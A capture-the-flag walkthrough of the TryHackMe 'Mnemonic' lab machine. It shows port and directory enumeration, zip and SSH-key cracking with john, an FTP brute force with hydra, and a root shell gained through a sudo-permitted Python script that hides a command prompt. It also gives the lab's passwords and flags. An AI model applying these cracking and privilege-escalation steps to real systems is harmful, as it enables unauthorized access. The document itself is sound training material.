# Mnemonic

## Description

I hope you have fun.

## [Task 1] Mnemonic

Hit me!

You need 1 things : hurry up 

No answer needed.

## [Taks 2] Enumerate

### 2.1 - How many open ports?

Let's start with a full port Nmap scan. The scan reveals three open ports:
* 21 ftp
* 80 http
* 1337 ssh

~~~
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/webmasters/*
|_http-title: Site doesn't have a title (text/html).
1337/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e0:42:c0:a5:7d:42:6f:00:22:f8:c7:54:aa:35:b9:dc (RSA)
|   256 23:eb:a9:9b:45:26:9c:a2:13:ab:c1:ce:07:2b:98:e0 (ECDSA)
|_  256 35:8f:cb:e2:0d:11:2c:0b:63:f2:bc:a0:34:f3:dc:49 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

Open ports: `3`

### 2.2 - what is the ssh port number?

We can discover the SSH port with a full port scan, which can be enabled with `-p-` flag.

SSH port: `1337`

### 2.3 - what is the name of the secret file?

Let's head to the web service, since we have no creds for other services:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Mnemonic]
└─$ curl -s "http://$IP/"                                          
<h1>Test</h1>
~~~

There is nothing on the main page. The first thing I checked, was `robots.txt` and discovered `/webmasters/` directory:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Mnemonic]
└─$ curl -s "http://$IP/robots.txt" 
User-agent: *
Allow: / 
Disallow: /webmasters/*
~~~

Let's run `gobuster` on it to find subdirectories or files:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Mnemonic]
└─$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://$IP/webmasters/ -x php,zip,html,txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.64.17/webmasters/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php,zip
[+] Timeout:                 10s
===============================================================
2021/11/04 03:22:44 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 321]
/backups              (Status: 301) [Size: 323]
/index.html           (Status: 200) [Size: 0]
~~~

We found `/admin` and `/backups`. Let's look further into the `/backups` subfolder. I used `-x` to find the files with the specified extentions:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Mnemonic]
└─$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://$IP/webmasters/backups -x php,zip,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.64.17/webmasters/backups
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php,zip
[+] Timeout:                 10s
===============================================================
2021/11/04 03:27:41 Starting gobuster in directory enumeration mode
===============================================================
/backups.zip          (Status: 200) [Size: 409]
/index.html           (Status: 200) [Size: 0]
~~~

Great! We found a zip file.

Answer: `backups.zip`

## [Task 3] Credentials

### 3.1 - ftp user name?

I downloaded the zip file and after attempting to unzip it, I was asked for a password:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Mnemonic/files]
└─$ unzip backups.zip 
Archive:  backups.zip
   creating: backups/
[backups.zip] backups/note.txt password: 
   skipping: backups/note.txt        incorrect password
~~~

We need to crack its password. First I used an addditional tool called `zip2john` which changes the format of the zip file to be crackable by `john`. Then I used `john` and `rockyou` wordlist to crack it:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Mnemonic/files]
└─$ zip2john backups.zip > backups.hash
backups.zip/backups/ is not encrypted!
ver 1.0 backups.zip/backups/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backups.zip/backups/note.txt PKZIP Encr: 2b chk, TS_chk, cmplen=67, decmplen=60, crc=AEE718A8

┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Mnemonic/files]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backups.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
00385007         (backups.zip/backups/note.txt)
1g 0:00:00:01 DONE (2021-11-04 03:35) 0.5813g/s 8296Kp/s 8296Kc/s 8296KC/s 0050bdtn..00120922A
Use the "--show" option to display all of the cracked passwords reliably
Session completed
~~~

Now we have the password. Let's unzip the backup file and see what we get:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Mnemonic/files]
└─$ unzip backups.zip
Archive:  backups.zip
   creating: backups/
[backups.zip] backups/note.txt password: 
  inflating: backups/note.txt
~~~

It extracted to a note. Let's read it:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Mnemonic/files]
└─$ cat backups/note.txt 
@vill

James new ftp username: ftpuser
we have to work hard
            
~~~

Great! Now we have the ftp username.

FTP username: `ftpuser`

### 3.2 - ftp password?

Now that we have the usrename, we can try to brute-force the password. I used `hydra` and `rockyou` wordlist:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Mnemonic/files]
└─$ hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://$IP/
Hydra v9.3-dev (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-04 03:36:51
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.10.64.17:21/
[STATUS] 256.00 tries/min, 256 tries in 00:01h, 14344142 to do in 933:52h, 16 active
[STATUS] 252.33 tries/min, 757 tries in 00:03h, 14343641 to do in 947:25h, 16 active
[21][ftp] host: 10.10.64.17   login: ftpuser   password: love4ever
1 of 1 target successfully completed, 1 valid password found
~~~

FTP password: `love4ever`

### 3.3 - What is the ssh username?

Now that we have creds for ftp, let's see what we can find there. There are a few directories in there. All of them are empty except one: `data-4`. There are `id_rsa` and `not.txt` inside it, so I downloaded them:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Mnemonic/files]
└─$ ftp $IP
Connected to 10.10.64.17.
220 (vsFTPd 3.0.3)
Name (10.10.64.17:user): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------   12 1003     1003         4096 Jul 14  2020 .
drwx------   12 1003     1003         4096 Jul 14  2020 ..
lrwxrwxrwx    1 1003     1003            9 Jul 14  2020 .bash_history -> /dev/null
-rw-r--r--    1 1003     1003          220 Jul 13  2020 .bash_logout
-rw-r--r--    1 1003     1003         3771 Jul 13  2020 .bashrc
-rw-r--r--    1 1003     1003          807 Jul 13  2020 .profile
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-1
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-10
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-2
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-3
drwxr-xr-x    4 0        0            4096 Jul 14  2020 data-4
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-5
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-6
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-7
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
226 Directory send OK.
ftp> cd data-4
250 Directory successfully changed.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    4 0        0            4096 Jul 14  2020 .
drwx------   12 1003     1003         4096 Jul 14  2020 ..
drwxr-xr-x    2 0        0            4096 Jul 14  2020 3
drwxr-xr-x    2 0        0            4096 Jul 14  2020 4
-rwxr-xr-x    1 1001     1001         1766 Jul 13  2020 id_rsa
-rwxr-xr-x    1 1000     1000           31 Jul 13  2020 not.txt
226 Directory send OK.
ftp> mget *
mget 3? n
mget 4? n
mget id_rsa? y
200 PORT command successful. Consider using PASV.
y150 Opening BINARY mode data connection for id_rsa (1766 bytes).
226 Transfer complete.
1766 bytes received in 0.00 secs (27.6097 MB/s)
mget not.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for not.txt (31 bytes).
226 Transfer complete.
31 bytes received in 0.00 secs (110.0852 kB/s)
~~~

`id_rsa` is an RSA private key. By reading the `not.txt`, we obtain a username:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Mnemonic/files]
└─$ cat not.txt         
james change ftp user password
~~~

SSH username: `james`

### 3.4 - What is the ssh password?

I attempted to connect to SSH using the key and the username we just obtained, but we need a password. Let's crack the private key. First I used an additional tool called `ssh2john` to change the format of the key to be crackable by `john`. Then I ran `john` with `rockyou` wordlist:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Mnemonic/files]
└─$ /usr/share/john/ssh2john.py id_rsa > rsa.hash 
                                                                                                                      
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Mnemonic/files]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt rsa.hash    
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bluelove         (id_rsa)
Warning: Only 1 candidate left, minimum 4 needed for performance.
1g 0:00:00:03 DONE (2021-11-04 04:00) 0.2906g/s 4169Kp/s 4169Kc/s 4169KC/s *7¡Vamos!
Session completed
~~~

SSH password: `bluelove`

### 3.5 - What is the condor password?

Now we can conncect via SSH using these credentials: `james:bluelove`. Don't forget to set the key's permission to 400. After connceting to the machine, if you wait a bit you'll get this message:

~~~
james@mnemonic:~$ 
                                                                               
Broadcast message from root@mnemonic (somewhere) (Thu Nov  4 09:18:06 2021):   
                                                                               
     IPS/IDS SYSTEM ON !!!!                                                    
 **     *     ****  **                                                         
         * **      *  * *                                                      
*   ****                 **                                                    
 *                                                                             
    * *            *                                                           
       *                  *                                                    
         *               *                                                     
        *   *       **                                                         
* *        *            *                                                      
              ****    *                                                        
     *        ****                                                             
                                                                               
 Unauthorized access was detected.

~~~

Unfortunately, “IPS/IDS System” claims that we are unauthorized and kills the connection. It means we need to be fast after connecting to the maachine. There are two interesting files in `james`' home deirectory: `noteforjames.txt` and `6450.txt`. Let's read them:

~~~
james@mnemonic:~$ ls -la
total 44
drwx------  6 james james 4096 Jul 14  2020 .
drwxr-xr-x 10 root  root  4096 Jul 14  2020 ..
-rw-r--r--  1 vill  vill   116 Jul 14  2020 6450.txt
lrwxrwxrwx  1 james james    9 Jul 14  2020 .bash_history -> /dev/null
-rw-r--r--  1 james james  220 Jul 13  2020 .bash_logout
-rw-r--r--  1 james james 3771 Jul 13  2020 .bashrc
drwx------  2 james james 4096 Jul 13  2020 .cache
drwx------  3 james james 4096 Jul 13  2020 .gnupg
drwxrwxr-x  3 james james 4096 Jul 13  2020 .local
-rw-r--r--  1 vill  vill   155 Jul 13  2020 noteforjames.txt
-rw-r--r--  1 james james  807 Jul 13  2020 .profile
drwx------  2 james james 4096 Jul 13  2020 .ssh
james@mnemonic:~$ cat noteforjames.txt
noteforjames.txt

@vill

james i found a new encryption İmage based name is Mnemonic  

I created the condor password. don't forget the beers on saturday
james@mnemonic:~$ cat 6450.txt
5140656
354528
842004
1617534
465318
1617534
509634
1152216
753372
265896
265896
15355494
24617538
3567438
15355494
~~~

`noteforjames.txt` is talking about an image-based encryption and `6450.txt` is a list of numbers. I saved it, in case we need it.

Then I took a look at `condor`'s home directory and there are interesting directories, which names are base64 encoded:

~~~
james@mnemonic:~$ ls -la /home/condor
ls: cannot access '/home/condor/..': Permission denied
ls: cannot access '/home/condor/'\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='\''': Permission denied
ls: cannot access '/home/condor/.gnupg': Permission denied
ls: cannot access '/home/condor/.bash_logout': Permission denied
ls: cannot access '/home/condor/.bashrc': Permission denied
ls: cannot access '/home/condor/.profile': Permission denied
ls: cannot access '/home/condor/.cache': Permission denied
ls: cannot access '/home/condor/.bash_history': Permission denied
ls: cannot access '/home/condor/.': Permission denied
ls: cannot access '/home/condor/aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==': Permission denied
total 0
d????????? ? ? ? ?            ?  .
d????????? ? ? ? ?            ?  ..
d????????? ? ? ? ?            ? 'aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw=='
l????????? ? ? ? ?            ?  .bash_history
-????????? ? ? ? ?            ?  .bash_logout
-????????? ? ? ? ?            ?  .bashrc
d????????? ? ? ? ?            ?  .cache
d????????? ? ? ? ?            ?  .gnupg
-????????? ? ? ? ?            ?  .profile
d????????? ? ? ? ?            ? ''\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='\'''
~~~

The string in the middle is a link to an image:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Mnemonic/files]
└─$ echo "aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==" | base64 -d
https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg
~~~

I downloaded the image and used common steganography tools, but none of them worked. I started googling and found [this github repository](https://github.com/MustafaTanguner/Mnemonic). Mnemonic is İmage - Based Encryption. Read its description for more info.

I cloned it on my machine and decoded the image using `6450.txt` number list and the tool:

~~~
┌──(user㉿Y0B01)-[~/…/thm/Mnemonic/files/Mnemonic]
└─$ python3 Mnemonic.py


ooo        ooooo                                                                o8o            
`88.       .888'                                                                `"'            
 888b     d'888  ooo. .oo.    .ooooo.  ooo. .oo.  .oo.    .ooooo.  ooo. .oo.   oooo   .ooooo.  
 8 Y88. .P  888  `888P"Y88b  d88' `88b `888P"Y88bP"Y88b  d88' `88b `888P"Y88b  `888  d88' `"Y8 
 8  `888'   888   888   888  888ooo888  888   888   888  888   888  888   888   888  888       
 8    Y     888   888   888  888    .o  888   888   888  888   888  888   888   888  888   .o8 
o8o        o888o o888o o888o `Y8bod8P' o888o o888o o888o `Y8bod8P' o888o o888o o888o `Y8bod8P' 


******************************* Welcome to Mnemonic Encryption Software *********************************
*********************************************************************************************************
***************************************** Author:@villwocki *********************************************
*********************************************************************************************************
****************************** https://www.youtube.com/watch?v=pBSR3DyobIY ******************************
---------------------------------------------------------------------------------------------------------


Access Code image file Path:/home/user/Desktop/walkthroughs/thm/Mnemonic/files/maxresdefault.jpg
File exists and is readable


Processing:0.txt'dir.


*************** PROCESS COMPLETED ***************
Image Analysis Completed Successfully. Your Special Code:

[REDACTED]

(1) ENCRYPT (2) DECRYPT

>>>>2
ENCRYPT Message to file Path'

Please enter the file Path:/home/user/Desktop/walkthroughs/thm/Mnemonic/files/6450.txt
 
 
 
pasificbell1981


PRESS TO QUİT 'ENTER' OR 'E' PRESS TO CONTİNUE.
~~~

Now we have `condor`'s password.

Password: `pasificbell1981`

## [Task 4] Hack the machine

### 4.1 - user.txt

The other base64 encoded string we found in `condor`'s home directory is the user flag:

~~~
┌──(user㉿Y0B01)-[~/…/thm/Mnemonic/files/Mnemonic]
└─$ echo "VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ==" | base64 -d
THM{a5f82a00e2feee3465249b855be71c01}
~~~

user.txt: `THM{a5f82a00e2feee3465249b855be71c01}`

### 4.2 - root.txt

Now we need to gain root access, in order to obtain the root flag. I ran `sudo -l` to check my sudo permissions:

~~~
condor@mnemonic:~$ sudo -l
Matching Defaults entries for condor on mnemonic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User condor may run the following commands on mnemonic:
    (ALL : ALL) /usr/bin/python3 /bin/examplecode.py
~~~

As you can see, we can run a python script (`/bin/examplecode.py`) using `python3` with sudo and no password. It is owned by root, so we don't have write permission:

~~~
condor@mnemonic:~$ la -la /bin/examplecode.py 
-rw-r--r-- 1 root root 2352 Jul 15  2020 /bin/examplecode.py
~~~

Let's see what it does:

~~~py
#!/usr/bin/python3
import os
import time
import sys
def text(): #text print 


	print("""

	------------information systems script beta--------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	----------------@author villwocki------------------""")
	time.sleep(2)
	print("\nRunning...")
	time.sleep(2)
	os.system(command="clear")
	main()


def main():
	info()
	while True:
		select = int(input("\nSelect:"))

		if select == 1:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ip a")
			print("Main Menü press '0' ")
			print(x)

		if select == 2:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ifconfig")
			print(x)

		if select == 3:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ip route show")
			print(x)

		if select == 4:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="cat /etc/os-release")
			print(x)

		if select == 0: 
			time.sleep(1)
			ex = str(input("are you sure you want to quit ? yes : "))
		
			if ex == ".":
				print(os.system(input("\nRunning....")))
			if ex == "yes " or "y":
				sys.exit()
                      

		if select == 5:                     #root
			time.sleep(1)
			print("\nRunning")
			time.sleep(2)
			print(".......")
			time.sleep(2)
			print("System rebooting....")
			time.sleep(2)
			x = os.system(command="shutdown now")
			print(x)

		if select == 6:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="date")
			print(x)




		if select == 7:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="rm -r /tmp/*")
			print(x)

                      
              


       


            

def info():                         #info print function
	print("""

	#Network Connections   [1]

	#Show İfconfig         [2]

	#Show ip route         [3]

	#Show Os-release       [4]

    #Root Shell Spawn      [5]           

    #Print date            [6]

	#Exit                  [0]

	""")

def run(): # run function 
	text()

run()
~~~

When you run the script, it prints out a menu with several options. By analyzing the code, I noticed something interesting in option 0. When you select this option and answer it with a dot (`.`), it displays a fake `Running...` string. It is actually a prompt (`input`) which waits for you to enter commands to execute (`os.system`):

~~~py
if select == 0: 
			time.sleep(1)
			ex = str(input("are you sure you want to quit ? yes : "))
		
			if ex == ".":
				print(os.system(input("\nRunning....")))  #<------
~~~

So if we run the script with sudo and execute `/bin/bash`, we'll get a root shell:

~~~
condor@mnemonic:~$ sudo /usr/bin/python3 /bin/examplecode.py


	------------information systems script beta--------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	----------------@author villwocki------------------

Running...



	#Network Connections   [1]

	#Show İfconfig         [2]

	#Show ip route         [3]

	#Show Os-release       [4]

    #Root Shell Spawn      [5]           

    #Print date            [6]

	#Exit                  [0]

	

Select: 0
are you sure you want to quit ? yes : .

Running..../bin/bash
root@mnemonic:~# id
uid=0(root) gid=0(root) groups=0(root)
~~~

Now we can head to `/root` and read the root flag:

~~~
root@mnemonic:~# cd /root
root@mnemonic:/root# ls
f2.txt  root.txt
root@mnemonic:/root# cat root.txt 
THM{congratulationsyoumadeithashme}
~~~

We got the flag, but the string in the middle should be an MD5 hash. Let's encrypt it then:

~~~
root@mnemonic:/root# echo -n "congratulationsyoumadeithashme" | md5sum
2a4825f50b0c16636984b448669b0586  -
~~~

root.txt: `THM{2a4825f50b0c16636984b448669b0586}`

# D0N3! ; )

Thanks to the creator(s)!

Hope you had fun and learned something!

Have a g00d one! : )